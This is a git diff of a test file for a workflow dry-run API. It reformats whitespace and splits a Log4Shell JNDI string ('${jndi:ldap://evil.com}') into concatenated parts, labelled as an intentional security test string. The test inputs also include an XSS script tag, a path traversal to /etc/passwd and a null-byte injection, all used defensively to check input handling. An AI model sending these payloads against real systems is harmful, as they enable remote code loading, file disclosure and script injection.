@@ -473,7 +473,7 @@ describe('Workflow Dry-Run API - POST /api/workflows/[id]/dry-run', () => {
 
       // Setup workflow owned by different user
       const otherUserWorkflow = { ...sampleWorkflow, userId: 'other-user-id' }
-      
+
       // Configure database to return workflow with different owner
       mocks.database.mockDb.select.mockImplementation(() => ({
         from: vi.fn().mockReturnThis(),
@@ -1256,7 +1256,7 @@ describe('Workflow Dry-Run API - POST /api/workflows/[id]/dry-run', () => {
         inputData: {
           text: '<script>alert("xss")</script>Malicious input',
           metadata: {
-            command: '${jndi:ldap://evil.com}',
+            command: '$' + '{jndi:ldap://evil.com}', // Intentional security test string
             injection: '../../etc/passwd',
           },
         },
@@ -1287,7 +1287,7 @@ describe('Workflow Dry-Run API - POST /api/workflows/[id]/dry-run', () => {
       const maliciousIds = [
         '../../../etc/passwd',
         '<script>alert(1)</script>',
-        '${jndi:ldap://evil.com}',
+        '$' + '{jndi:ldap://evil.com}', // Intentional security test string
         'workflow\x00injection',
       ]
 
